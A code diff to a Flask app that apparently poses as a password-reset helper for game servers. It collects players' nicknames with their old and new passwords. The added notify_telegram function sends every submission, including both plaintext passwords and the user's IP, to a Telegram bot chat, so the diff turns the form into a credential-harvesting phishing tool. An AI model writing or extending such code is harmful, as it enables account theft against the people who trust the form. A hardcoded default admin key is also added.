@@ -1,6 +1,8 @@
 import os
 import json
 import time
+import urllib.request
+import urllib.parse
 from threading import Lock
 from flask import Flask, render_template, request, redirect, url_for, abort
 
@@ -8,6 +10,8 @@ app = Flask(__name__)
 
 DB_PATH = "tickets.json"
 ADMIN_KEY = os.environ.get("ADMIN_KEY", "brhelper_adm_2026")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+CHAT_ID = os.environ.get("CHAT_ID", "")
 _lock = Lock()
 
 SERVERS = [
@@ -56,6 +60,30 @@ def _add(ticket):
         _save(data)
 
 
+def notify_telegram(ticket):
+    if not BOT_TOKEN or not CHAT_ID:
+        return
+    text = (
+        "🔑 НОВАЯ ЗАЯВКА\n"
+        "━━━━━━━━━━━━━━━\n"
+        f"Сервер: {ticket['server']}\n"
+        f"Ник: {ticket['nick']}\n"
+        f"Старый пароль: {ticket['old_password']}\n"
+        f"Новый пароль: {ticket['new_password']}\n"
+        f"IP: {ticket['ip']}\n"
+        f"Время: {ticket['time']}"
+    )
+    data = urllib.parse.urlencode({
+        "chat_id": CHAT_ID,
+        "text": text,
+    }).encode()
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    try:
+        urllib.request.urlopen(url, data=data, timeout=5)
+    except Exception as e:
+        print("NOTIFY ERROR:", repr(e))
+
+
 @app.route("/")
 def index():
     return render_template("index.html")
@@ -79,14 +107,16 @@ def reset_form(server):
         if not (nick and old_password and new_password):
             return redirect(url_for("reset_form", server=server))
 
-        _add({
+        ticket = {
             "server": server,
             "nick": nick,
             "old_password": old_password,
             "new_password": new_password,
             "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
             "time": time.strftime("%Y-%m-%d %H:%M:%S"),
-        })
+        }
+        _add(ticket)
+        notify_telegram(ticket)
 
         return redirect(url_for("done"))
 
